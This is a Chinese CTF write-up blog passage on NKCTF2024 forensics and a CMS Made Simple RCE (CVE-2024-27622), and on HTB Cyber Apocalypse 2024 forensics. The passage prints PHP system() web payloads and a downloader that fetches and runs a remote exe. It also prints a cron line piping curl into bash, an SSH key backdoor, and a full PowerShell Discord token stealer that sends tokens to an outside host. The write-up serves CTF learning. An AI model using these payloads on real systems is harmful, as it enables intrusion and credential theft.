docker容器 图片匹配)</h3><pre><code>本鼠鼠正在Coding，突然一声OPEN THE DOOR！本鼠鼠直接鼠躯一颤就双手抱头蹲下了，果然本鼠鼠只适合生活在阴暗的下水道被黑猫警长抓走的时候本鼠鼠还想辩解一下，但是他们拿出你的照片的时候，本鼠鼠认罪了昨晚和其他鼠鼠聊天的时候其他鼠鼠问本鼠鼠：“你到底喜欢她什么啊？”“喜欢一个人不需要理由”本鼠鼠很快敲完了键盘，刚要按下回车的时候突然愣住了。真的不需要理由吗？请找到鼠鼠的答案吧。hint：.vscode中的配置文件有和flag3相关的信息</code></pre><p>先看看给的附件 一个内存文件 一个压缩包里面有一张<code>pass.png</code>和一个secret文件 还有一个readme.txt </p><p>观察secret文件的大小 刚好是1MB 很工整的大小 猜测是一个VC容器 但是pass.png中的密码被打马赛克 只能看到最后一位是3</p><p>readme.txt中的内容 提到flag为3段 还提到等宽字体</p><pre><code>本鼠鼠的flag总共分为三段捏，flag为nkctf&#123;uuid&#125;形式，另外鼠鼠最喜欢等宽字体了，快快去找吧。</code></pre><p>首先用r-studio看一下关键文件 moe是主要登陆用户 找到了<code>.vscode</code>配置文件夹  桌面上有一个<code>Secret_Generator</code> 文件夹 是一个docker容器的配置文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403261612547.png" alt="image-20240326161246494"></p><h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><p>在来看看环境变量 找到一个名为<code>n0wayback</code> 值为<code>HPahXR4NvAnZXB16tNK6hAaNVNU++</code>的环境变量</p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\1z_F0r3ns1c5\1.raw --profile=Win7SP1x64 envars</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403262030179.png" alt="image-20240326203056067"></p><p>用随波逐流进行解码 发现是XXencode </p><pre><code>nkctf&#123;39c429eb-2faf</code></pre><h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p>再来看进程</p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\1z_F0r3ns1c5\1.raw --profile=Win7SP1x64 pslist</code></pre><p>找到<code>mspaint.exe</code>进程</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403262032561.png" alt="image-20240326203246448"></p><p><code>mspaint.exe</code>是计算机中画图工具 有这个进程猜测肯定是在图片中存有信息  我们用memdump将这个进程dump下来</p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\1z_F0r3ns1c5\1.raw --profile=Win7SP1x64 memdump -p 2052 -D E:\Desktop\NKCTF2024\forensics\1z_F0r3ns1c5</code></pre><p>将保存下来的<code>2052.dmp</code>文件后缀改为<code>.data</code> 使用gimp打开  调一下宽高大概是<code>1708*3468</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403262047654.png" alt="image-20240326204710597"></p><pre><code>flag2: 49a0-bd24-</code></pre><h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>现在我们来看上面找到的<code>Secret_Generator</code></p><p>其实这一操作我们在cmd命令行记录中也能看到 </p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\1z_F0r3ns1c5\1.raw --profile=Win7SP1x64 cmdscan</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403262121893.png" alt="image-20240326212143754"></p><p>我们可以在r-studio里面直接将这个文件夹恢复出来 看到是需要部署docker容器的</p><p>直接进入<code>Secret_Generator\docker</code>文件夹中 看到<code>docker-compose.yml</code> 我们可以使用这个文件利用docker-compose命令来配置docker容器中所需要的所有服务</p><p>安装docker-compose的命令</p><pre><code>curl -L &quot;https://github.com/docker/compose/releases/download/1.29.0/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-composechmod +x /usr/local/bin/docker-compose</code></pre><p>使用docker-compose命令部署docker容器 </p><pre><code>docker-compose builddocker-compose up</code></pre><p>看到yml文件中的内容是暴露了8080端口 直接访问<code>http://127.0.0.1:8080</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403271931535.png" alt="image-20240327193141461"></p><p>看到页面需要我们上传密文和自定义字体</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403271933242.png" alt="image-20240327193314201"></p><p>前面提到了的等宽字体 那估计这里需要我们提交的字体就是等宽字体了 搜了一下vscode中常见的等宽字体 有<code>Fria Code</code> <code>Consolas</code> <code>Courier New</code> 这里我们下一个<code>Fria Code</code>字体就行  在上传的时候随便上传一个Fria Code字体就行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403272046411.png" alt="image-20240327204617379"></p><p><a href="https://blog.csdn.net/hardwork617s/article/details/110789055?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171154027016800192212041%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=171154027016800192212041&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-110789055-null-null.142%5Ev100%5Epc_search_result_base9&utm_term=Fira%20Code&spm=1018.2226.3001.4187">下载安装配置Fria Code字体</a></p><p>这里就有点脑洞了 我们拿到的附件里面<code>某段flag</code>文件夹中 有个<code>pass.png</code>图片 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403272045172.png" alt="image-20240327204528145"></p><p>我们随便上传一个字体和一段字符  发现会给我们生成一张图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403272047981.png" alt="image-20240327204702926"></p><p>我们发现输入的是<code>123456</code>但是生成的图片中的内容多了一段<code>pass </code>内容  和<code>pass.png</code>中的内容类似了 而且文件夹中的<code>secret</code>大小刚好为1MB 一眼VC容器 我们需要利用网页生成字典文件 通过对照将pass.png中的VC容器挂载密码恢复出来 </p><p>直接在容器文件夹中找到生成图片的后台代码 在<code>\app\app.py</code>中</p><pre><code class="py">def generate_secret_image():    try:        secret = request.form.get(&#39;secret&#39;)        if not re.match(&quot;^[a-zA-Z0-9]+$&quot;, secret):            return jsonify(&#123;&#39;error&#39;: &#39;Secret text can only contain letters and numbers.&#39;&#125;), 400                secret = &#39;pass &#39; + secret        font_file = request.files.get(&#39;font&#39;)                if font_file:            font_extension = font_file.filename.rsplit(&#39;.&#39;, 1)[1].lower()            if font_extension not in ALLOWED_FONT_TYPES:                return jsonify(&#123;&#39;error&#39;: &#39;Invalid font file type. Only TTF, OTF, WOFF, WOFF2 files are allowed.&#39;&#125;), 400                        if font_file.content_length &gt; (10 * 1024 * 1024):                return jsonify(&#123;&#39;error&#39;: &#39;The font file is too large!&#39;&#125;), 400                        font_filename = str(uuid.uuid4()) + &#39;.&#39; + font_extension            font_path = save_font_file(font_file, font_filename)            font = ImageFont.truetype(font_path, 49, encoding=&#39;utf-8&#39;)        else:            return jsonify(&#123;&#39;error&#39;: &#39;Please select a font file.&#39;&#125;), 400                H = 60        W = 30        canvas = Image.new(&#39;RGB&#39;, (W * len(secret), H), (255, 255, 255))        pen = ImageDraw.Draw(canvas)        pen.text((0, 0), secret, &#39;black&#39;, font)        original_canvas = canvas.copy()        for i in range(5, len(secret)-1):            mosaic_img(canvas, W*i, 0, W*i+W, H//2)            mosaic_img(canvas, W*i, H//2, W*i+W, H)                original_img_base64 = image_to_base64(original_canvas)        secret_img_base64 = image_to_base64(canvas)                return jsonify(&#123;&#39;original_image&#39;: original_img_base64, &#39;secret_image&#39;: secret_img_base64&#125;)    except Exception as e:        print(&quot;An error occurred:&quot;, e)        return jsonify(&#123;&#39;error&#39;: &#39;Internal Server Error&#39;&#125;), 500</code></pre><p>其中关键的就是</p><pre><code class="python">secret = &#39;pass &#39; + secretfor i in range(5, len(secret)-1):            mosaic_img(canvas, W*i, 0, W*i+W, H//2)            mosaic_img(canvas, W*i, H//2, W*i+W, H)</code></pre><p>他读取了我们输入的内容作为<code>secret</code>的值 但是还在前面加了<code>pass </code> 同时将secret的内容从第五个字符到倒数第二个字符这部分内容打上马赛克</p><p>我们对代码进行修改 删掉<code>secret = &#39;pass &#39; + secret</code></p><pre><code>for i in range(len(secret)):            mosaic_img(canvas, W*i, 0, W*i+W, H//2)            mosaic_img(canvas, W*i, H//2, W*i+W, H)</code></pre><p>在尝试一下输入<code>ABCDEFG</code> 发现输出的图片上就只有<code>ABCDEFG</code>了 并且会全部被打上马赛克</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403281257248.png" alt="image-20240328125714210"></p><p>下面就是生成字典图片 输入<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403281257085.png" alt="image-20240328125746993"></p><p>然后我们将字典图片和pass.png都按字符进行分割 直接调gpt就行 </p><pre><code>帮我按照以下要求 写一段代码 我现在有一个1860*60的图片 请你帮我分割成30*60的小图片 放进dict文件夹中 命名规则按照如下顺序ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789  一共是62张小图片 最后 如果文件名为大写字母则为 “文件名-大写.png”</code></pre><pre><code class="python">from PIL import Imageimport osdef split_image(image_path, output_folder, width=30, height=60):    image = Image.open(image_path)    image_width, image_height = image.size    if image_width % width != 0 or image_height % height != 0:        print(&quot;Error: Invalid dimensions for splitting.&quot;)        return    num_columns = image_width // width    num_rows = image_height // height    if not os.path.exists(output_folder):        os.makedirs(output_folder)    chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;    char_index = 0    for col in range(num_columns):        for row in range(num_rows):            left = col * width            upper = row * height            right = left + width            lower = upper + height            cropped_image = image.crop((left, upper, right, lower))                        char = chars[char_index]            if char.isupper():                filename = f&quot;&#123;char&#125;-大写.png&quot;            else:                filename = f&quot;&#123;char&#125;.png&quot;                            cropped_image.save(os.path.join(output_folder, filename))            char_index += 1if __name__ == &quot;__main__&quot;:    input_image_path = &quot;dict2.png&quot; # 某段flag/pass.png    output_folder = &quot;dict1&quot;        # dict2    split_image(input_image_path, output_folder)</code></pre><p>然后就是利用哈希计算和字典 匹配出pass.png中的密码</p><pre><code class="python">import osimport hashlibdef calculate_hashes(folder):    hash_dict = &#123;&#125;    for filename in os.listdir(folder):        filepath = os.path.join(folder, filename)        if os.path.isfile(filepath):            with open(filepath, &#39;rb&#39;) as f:                image_data = f.read()                hash_value = hashlib.md5(image_data).hexdigest()                hash_dict[filename[:-4:]] = hash_value    return hash_dictdef find_matching_images(dict1, dict2):    matches = []    for filename, hash_value in dict2.items():        if hash_value in dict1.values():            matching_filename = [name for name, hash_val in dict1.items() if hash_val == hash_value][0]            matches.append(matching_filename)    return matchesif __name__ == &quot;__main__&quot;:    dict1_folder = &quot;dict1&quot;     dict2_folder = &quot;dict2&quot;     dict1_hashes = calculate_hashes(dict1_folder)    dict2_hashes = calculate_hashes(dict2_folder)    matching_images = find_matching_images(dict1_hashes, dict2_hashes)        print(&quot;Matching images found in dict1:&quot;)    for image in matching_images:        print(image)&#39;&#39;&#39;Matching images found in dict1:b143a6268e2a23&#39;&#39;&#39;</code></pre><p>dict2中14个被打马赛克的字符匹配出来的结果是<code>b143a6268e2a23</code>  再加上原来没有被打马赛克的字符 VC容器的密码就是<code>b143a6268e2a233</code>  直接进行挂载 得到flag3</p><pre><code>c4f222879312</code></pre><p>组合起来就是</p><pre><code>nkctf&#123;39c429eb-2faf49a0-bd24-c4f222879312&#125;</code></pre><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="my-first-cms-CVE-2024-27622"><a href="#my-first-cms-CVE-2024-27622" class="headerlink" title="my first cms(CVE-2024-27622)"></a>my first cms(CVE-2024-27622)</h3><p>首先dirsearch扫目录 扫到后台登陆页面<code>admin/login.php</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242112791.png" alt="image-20240324211243701"></p><p>抓个包开始爆破登陆密码 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242115397.png" alt="image-20240324211527287"></p><p>比较抽象是<code>admin/Admin123</code> 登陆后台 </p><p>注意到这个<code>CMSMadeSimple</code>框架的版本是2.2.19  搜一波漏洞</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242120123.png" alt="image-20240324212044011"></p><p><a href="https://github.com/capture0x/CMSMadeSimple">CVE-2024-27622</a></p><p>直接进行利用 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242122358.png" alt="image-20240324212227274"></p><p> 先抓<code>&lt;?php echo system(&#39;id&#39;); ?&gt;</code>测试一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242123611.png" alt="image-20240324212348525"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242124243.png" alt="image-20240324212408092"></p><p>成功回显 再看一下根目录 </p><pre><code>&lt;?php system(&quot;ls /&quot;); ?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242127820.png" alt="image-20240324212741748"></p><p>读取flag</p><pre><code>&lt;?php system(&quot;cat /_fffff1@g&quot;); ?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242128199.png" alt="image-20240324212836091"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> web </tag>
            
            <tag> forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTBCyberCTF2024</title>
      <link href="/2024/03/16/Cyber%20Apocalypse%202024%20Hacker%20Royale/"/>
      <url>/2024/03/16/Cyber%20Apocalypse%202024%20Hacker%20Royale/</url>
      
        <content type="html"><![CDATA[<h1 id="HTBCyberCTF2024"><a href="#HTBCyberCTF2024" class="headerlink" title="HTBCyberCTF2024"></a>HTBCyberCTF2024</h1><h2 id="Forensics-部分"><a href="#Forensics-部分" class="headerlink" title="Forensics(部分)"></a>Forensics(部分)</h2><h3 id="Urgent"><a href="#Urgent" class="headerlink" title="Urgent"></a>Urgent</h3><p>给的附件是一个xml文件 直接notepad打开 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403111402394.png" alt="image-20240311140231315"></p><p>解base64</p><pre><code>document.write(unescape(&#39;&gt;_ 404 Not FoundSub window_onloadconst impersonation = 3Const HIDDEN_WINDOW = 12Set Locator = CreateObject(&quot;WbemScripting.SWbemLocator&quot;)Set Service = Locator.ConnectServer()Service.Security_.ImpersonationLevel=impersonationSet objStartup = Service.Get(&quot;Win32_ProcessStartup&quot;)Set objConfig = objStartup.SpawnInstance_Set Process = Service.Get(&quot;Win32_Process&quot;)Error = Process.Create(&quot;cmd.exe /c powershell.exe -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile(&#39;https://standunited.htb/online/forms/form1.exe&#39;,&#39;%appdata%\form1.exe&#39;);Start-Process &#39;%appdata%\form1.exe&#39;;$flag=&#39;HTB&#123;4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT&#125;&quot;, null, objConfig, intProcessID)window.close()end sub&#39;));</code></pre><p>拿到flag</p><h3 id="It-Has-Begun"><a href="#It-Has-Begun" class="headerlink" title="It Has Begun"></a>It Has Begun</h3><pre><code>The Fray is upon us, and the very first challenge has been released! Are you ready factions!? Considering this is just the beginning, if you cannot musted the teamwork needed this early, then your doom is likely inevitable.</code></pre><p>直接仔细翻看给的script.sh  找到两段关键的</p><pre><code>echo &quot;ssh-rsa AAAAB4NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D7s4J0L7XV2kep0rNzgY1S1IdE8HDAf7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B user@tS_u0y_ll1w&#123;BTH&quot; &gt;&gt; /root/.ssh/authorized_keysecho &quot;*/5 * * * * root curl -s http://legions.korp.htb/0xda4.0xda4.$ARCH | bash -c &#39;NG5kX3kwdVJfR3IwdU5kISF9&#39; &quot; &gt;&gt; /etc/crontab</code></pre><p>第一段flag</p><pre><code>HTB&#123;w1ll_y0u_St</code></pre><p>第二段是解base64<code>NG5kX3kwdVJfR3IwdU5kISF9</code></p><pre><code>4nd_y0uR_Gr0uNd!!&#125;</code></pre><h3 id="An-unusual-sighting"><a href="#An-unusual-sighting" class="headerlink" title="An unusual sighting"></a>An unusual sighting</h3><pre><code>As the preparations come to an end, and The Fray draws near each day, our newly established team has started work on refactoring the new CMS application for the competition. However, after some time we noticed that a lot of our work mysteriously has been disappearing! We managed to extract the SSH Logs and the Bash History from our dev server in question. The faction that manages to uncover the perpetrator will have a massive bonus come competition!随着准备工作的结束，以及 The Fray 的临近，我们新成立的团队已经开始为比赛重构新的 CMS 应用程序。然而，一段时间后，我们注意到我们的很多工作都神秘地消失了！我们设法从有问题的开发服务器中提取了 SSH 日志和 Bash 历史记录。设法发现肇事者的派系将获得巨大的奖金！</code></pre><p>使用nc连接docker容器 </p><p>第一个问题</p><pre><code>What is the IP Address and Port of the SSH Server (IP:PORT)</code></pre><p>问的是通过ssh连接的ip和端口是什么 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151122502.png" alt="image-20240315112236452"></p><p>看到第三行的连接记录 前面的ip和端口是发起连接的 后面的ip和端口是连接的目标 后面的记录都是如此 那后面的ip和端口就是想通过ssh进行连接的ip和端口</p><pre><code>100.107.36.130:2221</code></pre><p>第二个问题</p><pre><code>What time is the first successful Login</code></pre><p>问的是第一次成功连接的时间</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151126225.png" alt="image-20240315112617183"></p><p>可以看到第一次连接是失败了 第二次连接成功 那第二次连接就是第一次成功连接 </p><pre><code>2024-02-13 11:29:50</code></pre><p>第三个问题</p><pre><code>What is the time of the unusual Login</code></pre><p>问的是非常规登陆的时间 </p><p>这里可能问的是特殊ip的登陆  只有一个特殊ip<code>2.67.182.119</code> 看着很像挖矿病毒或者攻击者的外部ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151603252.png" alt="image-20240315160355183"></p><pre><code>2024-02-19 04:00:14</code></pre><p>第四个问题</p><pre><code>What is the Fingerprint of the attacker&#39;s public key</code></pre><p>承接上一题 </p><pre><code>OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4</code></pre><p>第五个问题</p><pre><code>What is the first command the attacker executed after logging in</code></pre><p>问的是攻击者在登陆之后执行的第一个命令是什么</p><p>看<code>bash_history.txt</code> 由第三个问题知道攻击者是在<code>2024-02-19 04:00:14</code>之后登陆的 直接找这个时间对应的命令记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151615339.png" alt="image-20240315161550301"></p><pre><code>whoami</code></pre><p>第六个问题</p><pre><code>What is the final command the attacker executed before logging out</code></pre><p>问的是攻击者在登陆注销前执行的最后一个命令是什么</p><p>看<code>sshd.log</code> 攻击者是在<code>2024-02-19 04:38:17</code> 进行注销的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151618823.png" alt="image-20240315161830759"></p><p>再在<code>bash_history.txt</code>里面看看这个时间前执行的命令</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151619193.png" alt="image-20240315161928153"></p><pre><code>./setup</code></pre><p>然后就可以拿到flag</p><pre><code>HTB&#123;B3sT_0f_luck_1n_th3_Fr4y!!&#125;</code></pre><h3 id="Fake-Boost"><a href="#Fake-Boost" class="headerlink" title="Fake Boost"></a>Fake Boost</h3><pre><code>In the shadow of The Fray, a new test called &quot;&quot;Fake Boost&quot;&quot; whispers promises of free Discord Nitro perks. It&#39;s a trap, set in a world where nothing comes without a cost. As factions clash and alliances shift, the truth behind Fake Boost could be the key to survival or downfall. Will your faction see through the deception? KORP™ challenges you to discern reality from illusion in this cunning trial.</code></pre><p>在流量包中提取出来一个文件<code>freediscordnitro</code> 查看内容 发现是对一个字符串的处理 </p><pre><code>$s0yAY2gmHVNFd7QZ = $jozeq3n.ToCharArray() ; [array]::Reverse($s0yAY2gmHVNFd7QZ) ; -join $s0yAY2gmHVNFd7QZ 2&gt;&amp;1&gt; $null ;$LOaDcODEoPX3ZoUgP2T6cvl3KEK = [sYSTeM.TeXt.ENcODING]::UTf8.geTSTRiNG([SYSTEm.cOnVeRT]::FRoMBaSe64sTRing(&quot;$s0yAY2gmHVNFd7QZ&quot;)) ;</code></pre><p>先是将字符串进行反转 然后在解base64 </p><pre><code>$URL = &quot;http://192.168.116.135:8080/rj1893rj1joijdkajwda&quot;function Steal &#123;    param (        [string]$path    )    $tokens = @()    try &#123;        Get-ChildItem -Path $path -File -Recurse -Force | ForEach-Object &#123;                        try &#123;                $fileContent = Get-Content -Path $_.FullName -Raw -ErrorAction Stop                foreach ($regex in @(&#39;[\w-]&#123;26&#125;\.[\w-]&#123;6&#125;\.[\w-]&#123;25,110&#125;&#39;, &#39;mfa\.[\w-]&#123;80,95&#125;&#39;)) &#123;                    $tokens += $fileContent | Select-String -Pattern $regex -AllMatches | ForEach-Object &#123;                        $_.Matches.Value                    &#125;                &#125;            &#125; catch &#123;&#125;        &#125;    &#125; catch &#123;&#125;    return $tokens&#125;function GenerateDiscordNitroCodes &#123;    param (        [int]$numberOfCodes = 10,        [int]$codeLength = 16    )    $chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;    $codes = @()    for ($i = 0; $i -lt $numberOfCodes; $i++) &#123;        $code = -join (1..$codeLength | ForEach-Object &#123; Get-Random -InputObject $chars.ToCharArray() &#125;)        $codes += $code    &#125;    return $codes&#125;function Get-DiscordUserInfo &#123;    [CmdletBinding()]    Param (        [Parameter(Mandatory = $true)]        [string]$Token    )    process &#123;        try &#123;            $Headers = @&#123;                &quot;Authorization&quot; = $Token                &quot;Content-Type&quot; = &quot;application/json&quot;                &quot;User-Agent&quot; = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36&quot;            &#125;            $Uri = &quot;https://discord.com/api/v9/users/@me&quot;            $Response = Invoke-RestMethod -Uri $Uri -Method Get -Headers $Headers            return $Response        &#125;        catch &#123;&#125;    &#125;&#125;function Create-AesManagedObject($key, $IV, $mode) &#123;    $aesManaged = New-Object &quot;System.Security.Cryptography.AesManaged&quot;    if ($mode=&quot;CBC&quot;) &#123; $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC &#125;    elseif ($mode=&quot;CFB&quot;) &#123;$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CFB&#125;    elseif ($mode=&quot;CTS&quot;) &#123;$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CTS&#125;    elseif ($mode=&quot;ECB&quot;) &#123;$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB&#125;    elseif ($mode=&quot;OFB&quot;)&#123;$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::OFB&#125;    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7    $aesManaged.BlockSize = 128    $aesManaged.KeySize = 256    if ($IV) &#123;        if ($IV.getType().Name -eq &quot;String&quot;) &#123;            $aesManaged.IV = [System.Convert]::FromBase64String($IV)        &#125;        else &#123;            $aesManaged.IV = $IV        &#125;    &#125;    if ($key) &#123;        if ($key.getType().Name -eq &quot;String&quot;) &#123;            $aesManaged.Key = [System.Convert]::FromBase64String($key)        &#125;        else &#123;            $aesManaged.Key = $key        &#125;    &#125;    $aesManaged&#125;function Encrypt-String($key, $plaintext) &#123;    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)    $aesManaged = Create-AesManagedObject $key    $encryptor = $aesManaged.CreateEncryptor()    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);    [byte[]] $fullData = $aesManaged.IV + $encryptedData    [System.Convert]::ToBase64String($fullData)&#125;Write-Host &quot;______              ______ _                       _   _   _ _ _               _____  _____  _____   ___ |  ___|             |  _  (_)                     | | | \ | (_) |             / __  \|  _  |/ __  \ /   || |_ _ __ ___  ___  | | | |_ ___  ___ ___  _ __ __| | |  \| |_| |_ _ __ ___   `&#39; / /&#39;| |/&#39; |`&#39; / /&#39;/ /| ||  _| &#39;__/ _ \/ _ \ | | | | / __|/ __/ _ \| &#39;__/ _` | | . ` | | __| &#39;__/ _ \    / /  |  /| |  / / / /_| || | | | |  __/  __/ | |/ /| \__ \ (_| (_) | | | (_| | | |\  | | |_| | | (_) | ./ /___\ |_/ /./ /__\___  |\_| |_|  \___|\___| |___/ |_|___/\___\___/|_|  \__,_| \_| \_/_|\__|_|  \___/  \_____/ \___/ \_____/   |_/                                                                                                                                                                                                                  &quot;Write-Host &quot;Generating Discord nitro keys! Please be patient...&quot;$local = $env:LOCALAPPDATA$roaming = $env:APPDATA$part1 = &quot;SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf&quot;$paths = @&#123;    &#39;Google Chrome&#39; = &quot;$local\Google\Chrome\User Data\Default&quot;    &#39;Brave&#39; = &quot;$local\BraveSoftware\Brave-Browser\User Data\Default\&quot;    &#39;Opera&#39; = &quot;$roaming\Opera Software\Opera Stable&quot;    &#39;Firefox&#39; = &quot;$roaming\Mozilla\Firefox\Profiles&quot;&#125;$headers = @&#123;    &#39;Content-Type&#39; = &#39;application/json&#39;    &#39;User-Agent&#39; = &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36&#39;&#125;$allTokens = @()foreach ($platform in $paths.Keys) &#123;    $currentPath = $paths[$platform]    if (-not (Test-Path $currentPath -PathType Container)) &#123;continue&#125;    $tokens = Steal -path $currentPath    $allTokens += $tokens&#125;$userInfos = @()foreach ($token in $allTokens) &#123;    $userInfo = Get-DiscordUserInfo -Token $token    if ($userInfo) &#123;        $userDetails = [PSCustomObject]@&#123;            ID = $userInfo.id            Email = $userInfo.email            GlobalName = $userInfo.global_name            Token = $token        &#125;        $userInfos += $userDetails    &#125;&#125;$AES_KEY = &quot;Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k=&quot;$payload = $userInfos | ConvertTo-Json -Depth 10$encryptedData = Encrypt-String -key $AES_KEY -plaintext $payloadtry &#123;    $headers = @&#123;        &#39;Content-Type&#39; = &#39;text/plain&#39;        &#39;User-Agent&#39; = &#39;Mozilla/5.0&#39;    &#125;    Invoke-RestMethod -Uri $URL -Method Post -Headers $headers -Body $encryptedData&#125;catch &#123;&#125;Write-Host &quot;Success! Discord Nitro Keys:&quot;$keys = GenerateDiscordNitroCodes -numberOfCodes 5 -codeLength 16$keys | ForEach-Object &#123; Write-Output $_ &#125;</code></pre><p>找到第一部分flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403111908010.png" alt="image-20240311190848912"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403111908936.png" alt="image-20240311190856886"></p><pre><code>HTB&#123;fr33_N17r0G3n_3xp053d!_</code></pre><p>流量包里面还有一个文件<code>rj1893rj1joijdkajwda</code> </p><pre><code>bEG+rGcRyYKeqlzXb0QVVRvFp5E9vmlSSG3pvDTAGoba05Uxvepwv++0uWe1Mn4LiIInZiNC/ES1tS7Smzmbc99Vcd9h51KgA5Rs1t8T55Er5ic4FloBzQ7tpinw99kC380WRaWcq1Cc8iQ6lZBP/yqJuLsfLTpSY3yIeSwq8Z9tusv5uWvd9E9V0Hh2Bwk5LDMYnywZw64hsH8yuE/u/lMvP4gb+OsHHBPcWXqdb4DliwhWwblDhJB4022UC2eEMI0fcHe1xBzBSNyY8xqpoyaAaRHiTxTZaLkrfhDUgm+c0zOEN8byhOifZhCJqS7tfoTHUL4Vh+1AeBTTUTprtdbmq3YUhX6ADTrEBi5gXQbSI5r1wz3r37A71Z4pHHnAoJTO0urqIChpBihFWfYsdoMmO77vZmdNPDo1Ug2jynZzQ/NkrcoNArBNIfboiBnbmCvFc1xwHFGL4JPdje8s3cM2KP2EDL3799VqJw3lWoFX0oBgkFi+DRKfom20XdECpIzW9idJ0eurxLxeGS4JI3n3jl4fIVDzwvdYr+h6uiBUReApqRe1BasR8enV4aNo+IvsdnhzRih+rpqdtCTWTjlzUXE0YSTknxiRiBfYttRulO6zx4SvJNpZ1qOkS1UW20/2xUO3yy76Wh9JPDCV7OMvIhEHDFh/F/jvR2yt9RTFId+zRt12Bfyjbi8ret7QN07dlpIcppKKI8yNzqB4FA==</code></pre><p>不能直接解base64 应该是aes解密 需要找密钥  密钥其实也在上面解base64之后的字符串里面 </p><pre><code>$AES_KEY = &quot;Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k=&quot;</code></pre><p>需要解一下base64 </p><pre><code>cWphrNTk9wgWZ93t19jayqnlaDuIeFKi</code></pre><p>这个有点特殊  是CBC模式的解密  